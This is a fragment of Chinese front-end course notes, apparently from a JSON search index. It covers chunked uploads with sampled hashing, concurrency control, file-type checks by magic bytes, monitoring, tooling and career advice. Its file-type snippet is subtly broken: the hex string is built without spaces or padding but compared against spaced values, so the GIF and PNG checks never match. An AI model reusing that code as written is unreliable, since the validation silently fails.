\u62bd\u6837\u54c8\u5e0c\uff0c\u4e0d\u7b97\u5168\u90e8\u7684hash\uff0c\u5e03\u9686\u8fc7\u6ee4\u5668\u7b97\u6cd5\uff0c\u635f\u5931\u5c0f\u90e8\u5206\u7cbe\u5ea6\uff0c\u6362\u53d6\u54c8\u5e0c\u8ba1\u7b97\u6548\u7387\n    const hash = await this.calculateHashSample();\n    this.hash = hash;\n\n    this.chunks = chunks.map((chunk, index) =&gt; {\n      const name = hash + '-' + index;\n      return {\n        hash,\n        name,\n        index,\n        chunk: chunk.file,\n        progress: 0,\n      };\n    });\n  }\n}\n</code></pre> <ol> <li> <p>\u8ba1\u7b97hash\u5361\u987f\u89e3\u51b3\u4e86\uff0c\u6bd4\u5982100\u4e2a\u5207\u7247\u9700\u8981\u53d1\u9001\uff0c\u8bf7\u6c42\u6570\u91cf\u5f88\u591a\uff1a <pre><code>    1. \u5982\u679c\u76f4\u63a5promise.all\u4e0a\u4f20\uff0c\u6d4f\u89c8\u5668\u53d1\u8d77 100 \u4e2a tcp \u8bf7\u6c42\uff0c\u867d\u7136\u6d4f\u89c8\u5668\u6709\u5e76\u53d1\u9650\u5236\uff0c\u53ea\u4f1a\u540c\u65f6\u53d1\u90016\u4e2a\u4f20\u9012\u6570\u636e\uff0c\u540c\u65f6\u5efa\u7acb\u8fd9\u4e48\u591a\u8bf7\u6c42\uff0c\u4f1a\u8ba9\u6d4f\u89c8\u5668\u5361\u987f\u3002\n\n    2. \u63a7\u5236\u5e76\u53d1\u6570\uff0c\u6bd4\u59824\uff0c\u5f02\u6b65\u4efb\u52a1\u7684\u5e76\u53d1\u6570\u63a7\u5236\uff0c\u4f7f\u7528\u961f\u5217\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u4e2a\u529f\u80fd\u662f\u5934\u6761\u7ecf\u5e38\u7528\u7684\u7b14\u8bd5\u9898\n\n    3. \u8fd8\u53ef\u4ee5\u505a\u62a5\u9519\u91cd\u8bd5\uff1a\u5f02\u6b65\u4efb\u52a1\u901a\u8fc7\u4e00\u4e2a\u961f\u5217\u3002\u5982\u679c\u4efb\u52a1\u62a5\u9519\uff0c\u51fa\u5217\u518d\u585e\u8fdb\u53bb\uff1b\u540c\u4e00\u4e2a\u4efb\u52a1\u62a5\u95193\u6b21\uff0c\u6216\u80052\u6b21\uff0c\u7edf\u4e00\u7ec8\u6b62\u6574\u4e2a\u4e0a\u4f20\u4efb\u52a1\uff0c\u63d0\u793a\u7528\u6237\u62a5\u9519\uff0c\u91cd\u8bd5\uff0c\u7528\u5bf9\u8c61\u5b58\u50a8\u62a5\u9519\u7684\u6b21\u6570 {task1:1}\n</code></pre></p> </li> <li> <p>\u6839\u636e\u7f51\u901f\u786e\u5b9a\u5207\u7247\u5927\u5c0f \uff1a\u5148\u4f20\u4e00\u4e2a\u5207\u7247\uff0c\u770b\u770b\u8fd4\u56de\u7684\u65f6\u95f4 2. \u600e\u4e48\u5224\u5b9a\u4e0a\u4f20\u901f\u5ea6\u5408\u9002\uff1f\u4f7f\u7528TCP\u7684\u6162\u542f\u52a8\u903b\u8f91\uff0c\u5f88\u6d41\u7545\u3002\u5148\u4e22\u4e00\u4e2a\u5c0f\u533a\u5757\uff0c\u5224\u65ad\u8fd4\u56de\u65f6\u95f4\uff0c\u5982\u679c\u6bd4\u8f83\u77ed *2\uff0c\u5982\u679c\u8d85\u65f6/2\u3002\u7cfb\u6570\u53ef\u4ee5\u7528\u4e00\u4e9b\u6570\u636e\u516c\u5f0f\u53d8\u5f97\u5e73\u7f13\u4e00\u4e9b\u3002</p> </li> <li>\u6587\u4ef6\u6269\u5c55\u540d\uff0c\u600e\u4e48\u5224\u65ad\u7528\u6237\u4e0a\u4f20\u7684\u662f\u7b26\u5408\u8981\u6c42\u7684\u6587\u4ef6\u5462\uff08\u5982\u679c\u6211\u4eec\u53ea\u80fd\u4e0a\u4f20png\u56fe\u7247\uff09\u56e0\u4e3a\u6bcf\u4e2a\u6587\u4ef6\u90fd\u6709\u56fa\u5b9a\u7684\u5934\u4fe1\u606f\uff0c\u4e8c\u8fdb\u5236\u7684\u6587\u4ef6\u6d41 \u56fa\u5b9a\u4f4d\u6570\u7684\u503c\uff0c\u786e\u5b9a\u4e00\u4e2a\u6587\u4ef6\u7c7b\u578b \uff0c\u901a\u8fc7\u6587\u4ef6\u5185\u5bb9\u5224\u65ad\uff0c\u800c\u4e0d\u662f\u7b80\u5355\u7684\u540e\u7f00\u540d\uff08\u5b9e\u4f8b\uff1a\u628a\u4e00\u4e2apng\u56fe\u7247\u7684\u540e\u7f00\u6539\u6210 PDF\uff0c\u7136\u540e\u4e0a\u4f20\uff09VSCode hexdump\u56fe\u7247\u4f60\u7684\u5bbd\u9ad8\uff0c\u4e5f\u5728\u4e8c\u8fdb\u5236\u91cc(\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u5230\u56fe\u7247\u7684\u5c3a\u5bf8)\u3002\u56e0\u4e3a\u4e8c\u8fdb\u5236\u5199\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\uff0c \u901a\u5e384\u4e2a\u4e8c\u8fdb\u5236\u4e00\u8d77\uff0c\u53d8\u621016\u8fdb\u5236\uff0c\u597d\u663e\u793a\u3002</li> </ol> <pre><code>async blobToString(blob) {\n  return new Promise((resolve) =&gt; {\n    const reader = new FileReader();\n    reader.onload = function() {\n      // console.log(readers.result)\n      const ret = reader.result.split('').map(v =&gt; v.charCodeAt()).map(v =&gt; v.toString(16).toUpperCase()).join('');\n      resolve(ret);\n    }\n    reader.readAsBinaryString(blob);\n  });\n}\n\nasync isGif(file) {\n  // GIF \u6709\u4e24\u4e2a\u6807\u51c6 89a 87a\n  // \u524d\u97626\u4e2a\u662f16\u8fdb\u5236\uff08\u9700\u8981\u8fdb\u5236\u8f6c\u6362\uff09\n  const ret = await this.blobToString(file.slice(0, 6));\n  return (ret == '47 49 46 38 39 61') || (ret == '47 49 46 38 37 61');\n}\n\nasync isPng(file) {\n  const ret = await this.blobToString(file.slice(0, 8));\n  return ret == '89 50 4E 47 0D 0A 1A 0A';\n}\n\nasync isJpg(file) {\n  const len = file.size;\n  const start = await this.blobToString(file.slice(0, 2));\n  const end = await this.blobToString(file.slice(-2, len));\n  return start == 'FF D8' &amp;&amp; end == 'FF D9';\n}\n\n// \u901a\u8fc7\u6587\u4ef6\u6d41\u5224\u65ad\u56fe\u7247\u6587\u4ef6\n// \u5148\u5224\u65ad\u662f\u4e0d\u662fgif\nasync isImage(file) {\n  return await this.isGif(file) || await this.isPng(file);\n}\n</code></pre> <ol> <li>\u8868\u683c\u6e32\u67d3\uff0c\u5217\u8868\u6e32\u67d3\uff1a\u6570\u636e\u91cf\u5927\uff0cPC\u7aef\u5206\u2eda\uff0c\u79fb\u52a8\u7aef\u65e0\u95f4\u9694\u6eda\u52a8\uff0c\u4f7f\u7528\u865a\u62df\u5217\u8868</li> </ol>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_3","title":"\u9700\u6c42\u5206\u6790","text":"<ol> <li>\u767b\u5f55\u3001\u6ce8\u518c\u3001jwt</li> <li>\u4e2a\u4eba\u4e2d\u5fc3\u3001\u56fe\u7247\u4e0a\u4f20</li> <li>\u6587\u7ae0\u53d1\u5e03\uff08\u7b80\u5355\u7684\u5b9a\u5236\u4e00\u4e0bmarkdown\u7f16\u8f91\u5668\uff09</li> <li>\u6587\u7ae0\u5217\u8868\uff1a\u79fb\u52a8\u7aef\u4f7f\u7528\u65e0\u9650\u6eda\u52a8\uff0c\u865a\u62df\u5217\u8868</li> <li>\u7528\u6237\u5173\u6ce8\uff0c\u6587\u7ae0\u70b9\u8d5e\uff08\u8e29\uff09\uff0c\u8bc4\u8bba\uff08\u7528\u6237\u4e00\u5bf9\u591a\uff0c\u591a\u5bf9\u591a\u7684\u5173\u7cfb\u8bbe\u8ba1\uff0c\u9700\u8981\u540e\u7aef\u8bbe\u8ba1\u8868\uff0cmysql \u591a\u5bf9\u591a</li> <li>web-rtc \u6d4f\u89c8\u5668\u62ff\u5230\u6444\u50cf\u5934\u7684\u6743\u9650</li> </ol>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_4","title":"\u6280\u672f\u9009\u578b","text":"<ol> <li>\u6280\u672f\u9009\u578b\u6ca1\u6709\u5bf9\u9519\uff0c\u53ea\u6709\u5408\u4e0d\u5408\u9002\uff08VUE-REACT\u3001element\uff09</li> <li>\u56e2\u961f\u73b0\u72b6\u3001\u4e0a\u624b\u96be\u5ea6\u3001\u6280\u672f\u751f\u6001</li> <li>\u6280\u672f\u9009\u578b\u5bf9\u6bd4\uff1a\u7ec4\u4ef6\u6570\uff1bnpm\u4e0b\u8f7d\uff1b\u56e2\u961f\u4eba\u6570\uff1b\u67d0\u4e2a\u7ec4\u4ef6\uff1b\u6309\u9700\u52a0\u8f7d\uff1b\u914d\u5408\u7684admin\u6846\u67b6</li> </ol>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_5","title":"\u5f00\u53d1\u89c4\u8303","text":"<ul> <li>eslint\uff1a\u5982\u679c\u662f\u8001\u9879\u76ee\uff0c\u53ef\u4ee5\u8003\u8651\u589e\u91cfeslint:lint-staged\uff08\u65e7\u4ee3\u7801\u4e0d\u5904\u7406\uff0c\u65b0\u4ee3\u7801\u5904\u7406\uff09</li> <li>git \u5206\u652f\u7ba1\u7406</li> <li>git\u94a9\u5b50\uff1aprecommit\u4e4b\u524d\uff0c\u8dd1eslint</li> <li>gitlog \u89c4\u8303\uff1agitcommit-m'\u65e5\u5fd7\u89c4\u8303</li> <li>Npm script \u5de5\u4f5c\u6d41</li> <li>\u76ee\u5f55\u89c4\u8303 nuxt+eggjs \u8fd9\u4fe9\u81ea\u5df1\u7684\u89c4\u8303\uff0c\u6211\u4eec\u7528\u5c31\u53ef\u4ee5\u4e86</li> <li>\u7edf\u8ba1\uff1a\u56fd\u5185\u767e\u5ea6\u7edf\u8ba1\uff1bGA\uff08google analysis\uff09\uff1bgrowingio</li> <li>\u62a5\u9519\uff1asentry \u9519\u8bef\u65e5\u5fd7\u6570\u636e</li> <li>\u4ee3\u7801\u90e8\u7f72\uff1agithub action \u6216 gitlab \u7b80\u5355\u7684\u81ea\u52a8\u5316\uff1bpush \u89e6\u53d1\u4efb\u52a1\uff0c\u8dd1\u6d4b\u8bd5\uff0c\u53d1\u5e03\u90e8\u7f72\uff0c\u90e8\u7f72\u7ed3\u679c\u901a\u77e5\u4f01\u4e1a\u5fae\u4fe1\u6216\u8005\u9489\u9489\uff1b</li> <li>AXIOS\u914d\u7f6e\u7b49\u7b49</li> </ul> <p>\u505a\u9700\u6c42\u7684\u65f6\u5019\uff0c\u7528\u7b2c\u4e09\u65b9\u63d2\u4ef6\u6ca1\u95ee\u9898\u7684\uff0c\u4f46\u662f\uff0c\u60f3\u8fdb\u6b65\uff0c\u5c31\u8981\u770b\u6e90\u7801</p> <p>\u6211\u4eec\u5f00\u53d1\u9879\u76ee\uff0c\u7528\u7b2c\u4e09\u65b9\u5e93\u5373\u53ef\u3002\u60f3\u8fdb\u6b65\uff0c\u4e0d\u80fd\u53ea\u4f1a\u7528\uff0c\u800c\u8981\u770b\u61c2\u6e90\u7801</p> <p>\u7ad9\u5728\u4e00\u4e2a\u7a0d\u5fae\u9ad8\u7ea7\u4e00\u70b9\u7684\u89c6\u2ec6\uff0c\u4e00\u4e2a\u9879\u76ee\u5230\u5e95\u9700\u8981\u90a3\u4e9b\u4e1c\u2ec4</p> <p>\u76ee\u7684\u662f\u4e3a\u4e86\u7ad9\u5728\u4e00\u4e2a\u67b6\u6784\u5e08\u7684\u2ec6\u5ea6 \u4ee3\u7801\u80fd\u529b\u53ea\u662f\u5176\u4e2d\u4e00\u90e8\u5206\uff08\u6574\u4f53\u628a\u63a7\uff09</p>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_6","title":"\u7b2c\u4e8c\u8282\u7b14\u8bb0","text":"<p>\u4e0a\u6b21\u56de\u987e\uff1a\u590d\u6742\u9879\u76ee\u5bf9\u81ea\u5df1\u7684\u8981\u6c42\uff0c\u9700\u8981\u505a\u6210\u4ec0\u4e48\u6837\u3002</p> <ol> <li>\u6570\u636e\u91cf\u5927</li> <li>\u7f51\u7edc\uff0c\u7535\u8111\u7684\u6027\u80fd\uff0c\u5f88\u5dee</li> <li>\u7528\u6237\u60f3\u7684\u50bb\u4e00\u4e9b</li> </ol> <p>\u524d\u7aef\u67b6\u6784\u5e08\u7684\u8eab\u4efd\uff0c\u5982\u4f55\u770b\u5f85\u9879\u76ee\uff1f\u4ece\u5de5\u7a0b\u5e08=\u300b\u524d\u7aef\u7ba1\u7406\u7684\u8fc7\u7a0b\uff0c\u522b\u7684\u77e5\u8bc6\u4f53\u7cfb</p> <ol> <li>\u9879\u76ee\u4eba\u5458\u7684\u89c4\u5212\uff08\u62db\u8058\u4eba\u6570\uff0c\u9700\u8981\u4e0d\u540c\u5c42\u6b21\uff09</li> <li>\u9700\u6c42\u95ee\u9898\uff08\u9879\u76ee\u7ba1\u7406\uff09</li> <li> <p>\u9879\u76ee\u7684\u53ef\u7ef4\u62a4\u6027\uff08\u672a\u6765\uff09</p> </li> <li> <p>\u4ee3\u7801\u7684\u5b9e\u73b0\u662f\u5f00\u5fc3\u7684\u73b0\u5728</p> </li> <li> <p>\u5c0f\u9879\u76ee\u7684leader\u4e4b\u540e\uff0c\u5982\u4f55\u8fdb\u4e00\u6b65</p> </li> <li> <p>\u6bcf\u4e00\u6761\u8def\uff0c\u5bf9\u77e5\u8bc6\u548c\u80fd\u529b\u7684\u8981\u6c42\u662f\u4e0d\u4e00\u6837\u7684 \u5c31\u4ece\u8fd9\u4e2a\u9879\u76ee\u5f00\u59cb\u5c55\u5f00</p> </li> <li>\u767b\u5f55\u6ce8\u518c</li> <li>\u7528\u6237\u4e2d\u5fc3</li> <li>\u6587\u7ae0\u7ba1\u7406</li> <li>\u5173\u6ce8\u70b9\u8d5e\uff08\u591a\u5bf9\u591a\u7684\u5173\u7cfb\u8bbe\u8ba1\uff09 </li> <li>\u8bc4\u8bba</li> </ol>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_7","title":"\u505a\u9879\u76ee\u4e4b\u540e\u600e\u4e48\u53ef\u4ee5\u7ef4\u62a4\uff0c\u540e\u671f\u600e\u4e48\u53d1\u5c55\uff1f","text":"<ol> <li>\u5236\u5b9a\u89c4\u8303\uff08\u89c4\u77e9\uff09</li> <li>\u5f00\u6e90\uff08\u5f00\u53d1\u6548\u7387\uff0c\u5f71\u54cd\u529b\uff09</li> <li>code review</li> <li>\u5de5\u5177\uff08\u5f00\u53d1\u5de5\u5177\uff09</li> </ol>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_8","title":"\u4ee3\u7801\u4e4b\u540e","text":"<ol> <li>\u4eba\u6548\uff08\u5982\u4f55\u63d0\u9ad8\u6bcf\u4e2a\u4eba\u7684\u6548\u7387\uff0c\u6bcf\u4e2a\u7ef4\u5ea6\u7efc\u5408\u8003\u8651\uff09\u4ee3\u7801\u91cf\uff08\u5410\u69fd\uff09\uff0c\u53ef\u4ee5\u7528gitlab\u7684api\uff0c\u6765\u7edf\u8ba1\uff1b\u6bcf\u4e2a\u4eba\u90fd\u8981\u89e6\u78b0\u5230\u81ea\u5df1\u7684\u6781\u9650\u3002\u6bd4\u5982\u8f6e\u5c97\uff08\u6bcf\u4e2a\u4eba\u5c3d\u53ef\u80fd\u80fd\u7ef4\u62a4\u4e24\u4e2a\u6a21\u5757+\uff09 \u6bd4\u5982\u5185\u90e8\u7cfb\u7edf\u5956\u52b1\u673a\u5236\uff08\u56e2\u961f\u6587\u5316\uff09\uff0c\u53d1\u6325\u5185\u90e8\u4e3b\u7ba1\u80fd\u52a8\u6027\u3002\u65e5\u5fd7\u76d1\u63a7\uff0c\u4e3b\u52a8\u9886\u4efb\u52a1</li> <li>\u57fa\u7840\u5efa\u8bbe</li> </ol>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_9","title":"\u9879\u76ee\u2ed3\u671f\u7ef4\u62a4\u7684\u5fc5\u5907\u8bbe\u7f6e","text":"<p>\u547d\u4ee4\u884c\u5de5\u5177cli \u7ec4\u4ef6\uff08\u4ee3\u7801\u89c4\u8303\uff0c\u5355\u5143\u6d4b\u8bd5\uff09 </p> <p>\u57cb\u70b9\uff08\u6570\u636e\u91c7\u96c6\uff1a\u6027\u80fd\u76d1\u63a7\u3001\u9519\u8bef\u76d1\u63a7\u3001\u7528\u6237\u884c\u4e3a\u9519\u8bef\u76d1\u63a7\uff09</p> <ol> <li>\u6027\u80fd\u76d1\u63a7\uff1b\u6d4f\u89c8\u5668\u6216\u8005node\u628a\u7edf\u8ba1\u7684\u6027\u80fd\u53c2\u6570\uff0c\u53d1\u7ed9\u6211\u4eec\u670d\u52a1\u5668\uff1bperfomance\uff1blighthourse\uff08\u5b8f\u89c2\u7684\uff09 </li> </ol> <pre><code>window.performance\n{ startTime, requestStart, responseStart, responseEnd } \n\u8d44\u6e90\u52a0\u8f7d\u8017\u65f6 = responseEnd - startTime\n</code></pre> <ol> <li> <p>\u9519\u8bef\u76d1\u63a7\uff1asentry\uff1bfundebug \u4e5f\u633a\u6709\u610f\u601d\u7684\uff0c\u590d\u73b0\u529f\u80fd\uff1b\u539f\u7406\u4e5f\u4e0d\u96be\uff0cwindow.onerror\uff0ctrycatch\uff1b\u4e3b\u52a8\u4e0a\u62a5\uff1bpromise\u62a5\u9519\u3002\u53ef\u4ee5\u628a\u9519\u8bef\u5199\u5230\u4e00\u4e2a GIF \u56fe\u7247\u4e2d\uff0c\u7136\u540e\u53d1\u9001\u5230\u540e\u7aef\uff08\u767e\u5ea6\u5b9e\u73b0\u65b9\u6cd5\uff09</p> </li> <li> <p>\u7528\u6237\u884c\u4e3a\u65e5\u5fd7\u76d1\u63a7\uff1aga\uff1b\u767e\u5ea6\u7edf\u8ba1\uff1bgrowingio</p> </li> </ol> <p>\u6784\u5efa\u53d1\u5e03\uff1agitlab\uff1bgithub\uff08action\uff09\uff1b\u81ea\u52a8\u5316\u53d1\u5e03\uff0c\u9489\u9489\u63a8\u9001\u6d88\u606f</p>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_10","title":"\u7b2c\u4e8c\u4e2a\u89c6\u9891","text":"<p>\u4ee3\u7801\u5199\u5b8c\u4e86\uff0c\u9879\u76ee\u505a\u5b8c\u540e\uff0c\u4e4b\u540e\u600e\u4e48\u601d\u8003\uff1f\u6280\u672f\u6536\u83b7+\u4eba\u751f\u89c4\u5212</p> <p>\u8ba1\u5212\uff08\u5411\u4e0a\u7ba1\u7406\uff09</p> <ol> <li>\u56e2\u961f\u7684\u8d44\u6e90</li> <li>\u56e2\u961f\u7684\u6210\u2ed3</li> <li>\u76ee\u7684\u662f\u901a\u8fc7\u67d0\u4e2a\u9879\u76ee\uff0c\u4f18\u5316\u81ea\u5df1\u7684\u77e5\u8bc6\u4f53\u7cfb\uff08\u540c\u4e00\u4e2a\u9879\u76ee\uff0c\u540c\u4e00\u4e2a\u9700\u6c42\uff0c\u4e0d\u540c\u7684\u524d\u7aef\uff0c\u505a\u51fa\u6765\u5c31\u662f\u4e0d\u4e00\u6837\uff09</li> </ol>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_11","title":"\u5bf9\u56e2\u961f\u548c\u81ea\u5df1\u7684\u8981\u6c42\uff08\u6280\u672f\u7ea7\u522b\uff0c\u6709\u70b9\u50cf\u5b66\u5386\uff09","text":"<ol> <li>P5\uff1a\u4e2d\u7ea7\u5de5\u7a0b\u5e08\uff1a\u72ec\u7acb\u5b8c\u6210\u7ecf\u9a8c\u4e30\u5bcc\uff0c\u7ed9\u6211\u9700\u6c42\u53ef\u4ee5\u5b8c\u6210\uff0c\u91cd\u70b9\u662f\u4ee3\u7801</li> <li>P6\uff1a\u9ad8\u7ea7\u5de5\u7a0b\u5e08\uff1a\u8981\u6c42\u62c5\u5f53\uff08\u519b\u4ee4\u72b6\uff0c\u53ef\u4ee5\u5b8c\u6210\u4e00\u4e2a\u5927\u578b\u4efb\u52a1\uff09\uff0c\u524d\u6cbf\u7814\u7a76\uff08\u5206\u6790\u95ee\u9898\u7684\u80fd\u529b\uff09\u8e29\u5751\uff08\u6e90\u7801\u9605\u8bfb\uff09</li> <li>P7\uff1a\u9886\u57df\u4e13\u5bb6\uff1b\u4f53\u7cfb\u5316\u77e5\u8bc6\uff0c\u67d0\u4e2a\u9886\u57df\u5185\u6709\u5353\u8d8a\u7684\u4ea7\u51fa\uff08github\u5f00\u6e90\u9879\u76ee\u51e0\u767e\u4e2a\u661f\u661f\uff09 </li> </ol> <p>\u6280\u672f\u8def\u7ebf\uff0c\u53ef\u4ee5\u662fP\u7ea7\u522b\u662f\u5176\u4e2d\u4e00\u6761\u8def\uff0cwinter\u8001\u5e08\uff0c\u7389\u4f2f\uff0c\u5f20\u4e91\u2ef0\uff0c\u5c24\u5927\uff0c\u5f20\u946b\u65ed\u3002\u3002\u3002\u6709\u5f88\u591a\u8def\u7ebf\uff08\u5927\u5bb6\u57fa\u672c\u77e5\u8bc6\u719f\u6089\uff0c\u9700\u8981\u6709\u81ea\u5df1\u7684\u7279\u957f\uff09\u524d\u7aef\u7684\u8def\u7ebf\u53c8\u5f88\u591a\uff0c\u6bcf\u6761\u8def\u8981\u6c42\u7684\u77e5\u8bc6\u90fd\u4e0d\u4e00\u6837</p> <ol> <li>\u7389\u4f2f\uff0c\u4f53\u9a8c\u79d1\u6280\uff0c\u6df1\u6316\u524d\u7aef\u6280\u672f\u548c\u7ba1\u7406\uff0c\u8bed\u96c0</li> <li>winter\uff0cP8\u4e4b\u540e\uff0c\u518d\u641e\u6559\u80b2\uff08\u6a2a\u5411\u53d1\u5c55\uff0c\u6ca1\u6709\u7ee7\u7eed\u6df1\u9020P\uff09\uff0c\u624b\u6dd8</li> <li>\u5f20\u4e91\u2ef0\uff08fis\u7684\u4f5c\u8005\uff09\uff1a\u5168\u6c11\u76f4\u64ad\uff0c\u8d70\u7684\u662f\u5168\u6808CTO\u7684\u8def\u7ebf</li> <li>\u5f20\u946b\u65ed\uff0ccss\u6b7b\u78d5\uff0c\u9605\u6587\u96c6\u56e2</li> <li>\u5c24\u5927\uff1a\u72ec\u7acb\u5f00\u53d1\u8005</li> </ol>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_12","title":"\u601d\u8003\u4e00\u4e0b\u81ea\u5df1\u672a\u6765\u7684\u53d1\u5c55","text":"<ul> <li> <p>\u5927\u516c\u53f8\u524d\u7aef\u67b6\u6784\u5e08\uff1a\u591a\u5173\u6ce8\u6280\u672f\uff1a\u6280\u672f\u539f\u7406\uff0cvuenuxt\uff0cegg\uff1b\u8ba1\u7b97\u673a\u57fa\u7840\uff1b\u7b97\u6cd5\uff0c\u7f51\u7edc\uff0c\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6570\u636e\u5e93.... \uff1b\u4ece\u7b97\u6cd5\u5f00\u59cb\uff0c\u7b97\u6cd5\u8bad\u7ec3\u8425\u6b22\u8fce\u5927\u5bb6\uff1b\u7f51\u7edc\u534f\u8bae\u8ddf\u4e0a\uff1b\u524d\u7aef\u7684\u524d\u6cbf\u6280\u672f\u3002\u5de5\u4f5c\u5185\u5bb9\uff1a\u6709\u6ca1\u6709\u5174\u8da3\u8bfb\u5b8cvue\u6e90\u7801\uff1f</p> </li> <li> <p>\u5927\u516c\u53f8\u524d\u7aef\u7ecf\u7406\uff1a\u591a\u5173\u6ce8\u4eba\uff1a\u7ba1\u7406\uff0c\u542c\u8d77\u6765\u9ad8\u5927\u4e0a\uff0c\u5e72\u8d77\u6765\u5f88\u8f9b\u82e6\uff1b\u4eba\u5458\u7684\u62db\u8058\u89c4\u5212\uff0c\u8fdb\u5ea6\u7684\u7ba1\u7406\uff0c\u8d44\u6e90\u7684\u534f\u8c03\u3002\u3002\u3002 \u61c2\u6280\u672f\uff0c\u61c2\u4eba\uff1b\u540c\u65f6\uff0c\u4f60\u7684\u6280\u672f\u8fd8\u4e0d\u80fd\u843d\u4e0b\uff0c\u5426\u5219\u5e95\u4e0b\u7684\u4eba\u5bf9\u4f60\u6ca1\u6709\u6280\u672f\u5c0a\u91cd\uff0c\u961f\u4f0d\u4e0d\u597d\u5e26\u554a\u3002\u5de5\u4f5c\u7684\u5185\u5bb9\u4f1a\u53d1\u751f\u53d8\u5316\uff1a\u628a\u6211\u4eec\u7684\u5c0f\u5f00\u793e\u533a\u5bf9\u5916\u53d1\u5e03\u7ef4\u62a4\uff0c\u4f60\u9700\u8981\u51e0\u4e2a\u4eba\uff1b\u8fd9\u51e0\u4e2a\u4eba\uff0c\u600e\u4e48\u62db\uff0c\u8ddfhr\u804a\uff1b\u62db\u5230\u4e4b\u540e\uff0c\u600e\u4e48\u5efa\u8bbe\u56e2\u961f\uff08\u63d0\u5347\u79ef\u6781\u6027\uff1b\u63d0\u5347\u6210\u5458\u6280\u672f\u80fd\u529b\uff09\u6d41\u7a0b\u6709\u6548\u6267\u884c\uff08\u7ee9\u6548KPI\uff0c\u8fd8\u662fokr\uff09\u7ee9\u6548\u5dee\u7684\u54e5\u4eec\uff0c\u548c\u597d\u7684\u54e5\u4eec\uff0c\u600e\u4e48\u53bb\u8ddf\u4ed6\u6c9f\u901a\uff1b\u600e\u4e48\u7559\u4eba\u548c\u5f00\u4eba\uff08\u963f\u91cc\u8fde\u7eed\u4e24\u5e74KPI\u6700\u5dee\u88ab\u5f00\u4e86\uff09\u6709\u5f88\u591a\u7c7b\u4f3c\u8fd9\u79cd\u4efb\u52a1</p> </li> <li>\u5c0f\u516c\u53f8\u6280\u672f\u603b\u76d1\uff1a\u7a0d\u5fae\u5f31\u5316\u524d\u7aef\uff0c\u5f3a\u5316\u540e\u7aef\u6216\u8005\u5168\u6808\uff1b\u5f3a\u5316\u4ea7\u54c1\u80fd\u529b\uff1b\u5f3a\u5316\u7ba1\u7406\u80fd\u529b\uff1b\u63a5\u89e6\u7684\u66f4\u5e7f\uff0c\u66f4\u6cdb\u6cdb\uff0c\u66f4\u9700\u8981\u7efc\u5408\u5b9e\u529b</li> <li>\u72ec\u7acb\u5f00\u53d1\u8005\uff0c\u72ec\u7acb\u505a\u9879\u76ee\uff1a\u516c\u53f8\u5c31\u4f60\u4e00\u4e2a\u4eba\uff0c\u505a\u4e00\u4e2a\u4ea7\u54c1\u6765\u517b\u6d3b\u81ea\u5df1\uff08\u9700\u8981\u7efc\u5408\u7684\u80fd\u529b\uff1a\u5168\u6808!!!\uff1b\u8425\u9500\uff1b\u4ea7\u54c1\uff1b\u7528\u6237\u589e\u2ed3\uff09\u4ec0\u4e48\u90fd\u5e72\uff1b\u6781\u53ef\u80fd\u591a\u7528\u5f00\u6e90\u548c\u6210\u578b\u4ea7\u54c1\uff1b\u7b49\u7b49\u2014\u2014\u56fd\u5185\u4e0d\u591a</li> </ul>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_13","title":"\u52a0\u73ed","text":"<p>\u5f88\u591a\u516c\u53f8\u90fd\u6709\u52a0\u73ed\uff0c\u2ed3\u671f996\u7684\u7ed3\u679c\uff0c\u5e76\u4e0d\u80fd\u63d0\u5347\u4f60\u7684\u6548\u7387\uff0c\u53ea\u4f1a\u8ba9\u4f60\u7231\u4e0a\u6478\u2ee5\u3002</p> <ol> <li>\u5b66\u4e60\u7684\u91cd\u8981\u6027\u5927\u4e8e\u52a0\u73ed</li> <li>\u77ed\u671f996\u53ef\u4ee5\u63a5\u53d7\uff0c\u5e38\u5e74996\u8fd8\u662f\u7b97\u4e86\uff08\u81ea\u5df1\u6709\u4e00\u70b9\u751f\u6d3b\uff0c\u4e1a\u4f59\u65f6\u95f4\u53ef\u4ee5\u5b66\u4e60\uff09</li> <li>\u52a0\u73ed\u80fd\u5b66\u4f1a\u7b97\u6cd5\u5417\uff1f\u52a0\u73ed\u53ef\u4ee5\u77ed\u671f\u5185\u8ba9\u6280\u80fd\u66f4\u719f\u7ec3\uff0c\u7f16\u7a0b\u7684\u9ad8\u624b\u66f4\u9700\u8981\u5b66\u4e60\uff08\u5b66\u4e60\u597d\u7684\u7b97\u6cd5\uff09</li> </ol> <p>\u4ee5\u540e\u5b66\u4e0d\u52a8\u4e86\u4f1a\u4e0d\u4f1a\u88ab\u6dd8\u6c70\u554a</p> <ol> <li>\u53ea\u5b66\u76ae\u6bdb\uff0c\u4e00\u5b9a\u4f1a\u88ab\u6dd8\u6c70\uff1b\u5b66\u6838\u5fc3\u7684\u77e5\u8bc6\uff0c\u6838\u5fc3\u77e5\u8bc6\u6c38\u4e0d\u8fc7\u65f6\uff08\u7b97\u6cd5\u3001\u7f16\u8bd1\u539f\u7406\uff0cast \u62bd\u8c61\u8bed\u6cd5\u6811\u3001codegen\u6838\u5fc3\u7406\u5ff5\uff09</li> 